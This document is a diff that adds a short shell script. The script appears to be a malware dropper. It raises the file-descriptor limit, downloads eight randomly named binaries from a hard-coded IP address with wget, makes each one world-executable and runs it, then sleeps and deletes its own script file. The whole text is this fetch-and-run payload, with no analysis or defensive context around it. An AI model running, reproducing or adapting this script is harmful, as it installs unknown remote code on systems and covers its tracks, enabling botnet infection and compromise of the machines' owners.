@@ -1,0 +1,14 @@
+#!/bin/sh 
+
+ulimit -n 712
+wget http://31.14.136.217/ijdfj; chmod 777 ijdfj; ./ijdfj
+wget http://31.14.136.217/cmiiw; chmod 777 cmiiw; ./cmiiw
+wget http://31.14.136.217/pweom; chmod 777 pweom; ./pweom
+wget http://31.14.136.217/vyowpsf; chmod 777 vyowpsf; ./vyowpsf
+wget http://31.14.136.217/kmief3; chmod 777 kmief3; ./kmief3
+wget http://31.14.136.217/l290e; chmod 777 l290e; ./l290e
+wget http://31.14.136.217/evmei3; chmod 777 evmei3; ./evmei3
+wget http://31.14.136.217/cwo933; chmod 777 cwo933; ./cwo933
+sleep 3;
+ 
+rm -rf blud7.sh
